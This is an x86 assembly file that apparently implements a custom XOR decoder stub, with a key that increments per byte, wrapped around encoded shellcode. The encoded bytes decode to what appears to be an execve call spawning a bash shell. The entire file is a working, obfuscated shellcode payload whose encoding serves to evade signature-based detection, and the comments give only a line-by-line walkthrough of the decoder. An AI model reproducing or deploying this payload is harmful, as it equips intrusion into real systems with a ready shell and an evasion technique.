global _start

section .text
_start:
	xor ebx, ebx
	jmp short notshellcode ; Jump to encoded shellcode

savestate:
	pop esi ; Pop the address of encoded shellcode in ESI
	mov bl, 0xC4 ; Move our XOR key in bl

decode:
	xor byte [esi], bl 	; XOR current byte with bl -> 0xC4
	inc esi 		; Move to next byte of encoded shellcode

	cmp byte [esi], 0xbb 	; Compare the next byte with our terminator byte "0xbb" to confirm if we hit the end of the shellcode
	jz shellcode		; If yes, jump to shellcode 

	;else

	inc bl			; Increment XOR key value
	jmp short decode 	; Jmp to decoder routine.

	; Repeat until last byte is hit


notshellcode:
	call savestate
	shellcode: db 0xf5,0x05,0x96,0xaf,0xaa,0xa8,0xb9,0xa3,0xa4,0xaf,0xa7,0xa1,0xff,0xb9,0xfd,0xfc,0xfb,0xfa,0x5f,0x34,0x88,0x50,0x38,0x88,0x55,0x3c,0x6e,0xd4,0x2d,0x61,0xbb
